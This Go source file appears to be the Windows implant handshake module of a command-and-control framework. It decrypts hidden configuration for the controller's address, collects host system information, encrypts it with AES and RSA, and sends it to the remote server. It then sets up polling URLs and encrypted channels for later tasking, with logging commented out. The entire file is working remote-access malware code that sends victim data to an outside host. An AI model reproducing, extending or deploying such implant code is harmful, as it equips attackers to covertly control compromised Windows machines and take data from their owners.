// server/docker/payloads/Windows/handshake.go

//go:build windows
// +build windows

package main

import (
	"fmt"
)

type HandshakeManager struct {
	decryptedValues map[string]string
	currentClientID string
	initialClientID string // Store the very first client ID
	getURL          string
	postURL         string
	secureComms     *SecureComms

	// Parsed transform DataBlocks
	getClientIDDataBlock  *DataBlock
	postClientIDDataBlock *DataBlock
	postDataDataBlock     *DataBlock
	responseDataDataBlock *DataBlock
}

func NewHandshakeManager() (*HandshakeManager, error) {
	decrypted := decryptAllValues()

	hm := &HandshakeManager{
		decryptedValues: decrypted,
		initialClientID: clientID,
	}

	// Parse transform DataBlocks if configured
	if jsonStr := decrypted[geKeyGetClientIDTransforms]; jsonStr != "" {
		hm.getClientIDDataBlock = parseDataBlock(jsonStr)
	}
	if jsonStr := decrypted[geKeyPostClientIDTransforms]; jsonStr != "" {
		hm.postClientIDDataBlock = parseDataBlock(jsonStr)
	}
	if jsonStr := decrypted[geKeyPostDataTransforms]; jsonStr != "" {
		hm.postDataDataBlock = parseDataBlock(jsonStr)
	}
	if jsonStr := decrypted[geKeyResponseDataTransforms]; jsonStr != "" {
		hm.responseDataDataBlock = parseDataBlock(jsonStr)
	}

	return hm, nil
}

func (hm *HandshakeManager) PerformHandshake() error {
	// Step 1: Collect fresh system info with new seed
	sysInfoReport, err := CollectSystemInfo(hm.initialClientID) // Use initial client ID
	if err != nil {
		return fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Step 2: Convert to JSON
	jsonOutput, err := sysInfoReport.ToJSON()
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Step 3: Double encrypt the JSON (AES + RSA)
	encryptedJSON, err := EncryptInitialHandshake(
		jsonOutput,
		hm.decryptedValues[geKeySecret],
		hm.decryptedValues[geKeyPublicKey],
	)
	if err != nil {
		return fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Step 4: Build POST URL with initial clientID
	baseURL := buildBaseURL(
		hm.decryptedValues[geKeyProtocol],
		hm.decryptedValues[geKeyIP],
		hm.decryptedValues[geKeyPort],
	)
	postURL := buildPostURL(
		baseURL,
		hm.decryptedValues[geKeyPostRoute],
		hm.decryptedValues[geKeyPostClientIDName],
		hm.initialClientID, // Use initial client ID for the handshake
	)

	// Step 5: Send handshake and get new client ID
	newClientID, err := sendInitialPost(postURL, encryptedJSON, hm.decryptedValues)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	//log.Printf("Handshake successful - New Client ID: %s", newClientID)

	// Step 6: Store old client ID in case we need to revert
	//oldClientID := hm.currentClientID

	// Step 7: Update current client ID (but keep initial ID the same)
	hm.currentClientID = newClientID
	clientID = newClientID // Update global clientID

	// Build new URLs with new client ID for subsequent communications
	if hm.getClientIDDataBlock != nil {
		getRoute := hm.decryptedValues[geKeyGetRoute]
		if len(getRoute) > 0 && getRoute[0] != '/' {
			getRoute = "/" + getRoute
		}
		hm.getURL = baseURL + getRoute
	} else {
		hm.getURL = buildGetURL(
			baseURL,
			hm.decryptedValues[geKeyGetRoute],
			hm.decryptedValues[geKeyGetClientIDName],
			newClientID,
		)
	}

	if hm.postClientIDDataBlock != nil {
		postRoute := hm.decryptedValues[geKeyPostRoute]
		if len(postRoute) > 0 && postRoute[0] != '/' {
			postRoute = "/" + postRoute
		}
		hm.postURL = baseURL + postRoute
	} else {
		hm.postURL = buildPostURL(
			baseURL,
			hm.decryptedValues[geKeyPostRoute],
			hm.decryptedValues[geKeyPostClientIDName],
			newClientID,
		)
	}

	//log.Printf("Updated URLs with new client ID:")
	//log.Printf("Initial Client ID: %s", hm.initialClientID)
	//log.Printf("Previous Client ID: %s", oldClientID)
	//log.Printf("New Client ID: %s", newClientID)
	//log.Printf("New GET URL: %s", hm.getURL)
	//log.Printf("New POST URL: %s", hm.postURL)

	// Step 9: Initialize SecureComms with initial secret and new seed
	hm.secureComms = NewSecureComms(
		hm.decryptedValues[geKeySecret],
		sysInfoReport.AgentInfo.Seed,
	)

	// Step 10: Initialize polling config with new parameters
	// NOTE: We don't start polling here anymore - let the caller handle it

	// REMOVED Step 11 - Don't start polling in the handshake function
	// The caller (main.go or refreshHandshake) will start polling

	return nil
}

func (hm *HandshakeManager) RefreshHandshake() error {
	//log.Println("Starting refresh handshake...")
	oldClientID := hm.currentClientID

	err := hm.PerformHandshake()
	if err != nil {
		// On error, ensure we restore old client ID
		hm.currentClientID = oldClientID
		clientID = oldClientID
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	return nil
}

func (hm *HandshakeManager) GetCurrentClientID() string {
	return hm.currentClientID
}

func (hm *HandshakeManager) GetCurrentURLs() (string, string) {
	return hm.getURL, hm.postURL
}

func (hm *HandshakeManager) SetClientID(clientID string) {
	hm.currentClientID = clientID
}

func (hm *HandshakeManager) GetSecureComms() *SecureComms {
	return hm.secureComms
}

// GetTransformDataBlocks returns all parsed DataBlock configurations
func (hm *HandshakeManager) GetTransformDataBlocks() (getClientID, postClientID, postData, responseData *DataBlock) {
	return hm.getClientIDDataBlock, hm.postClientIDDataBlock, hm.postDataDataBlock, hm.responseDataDataBlock
}
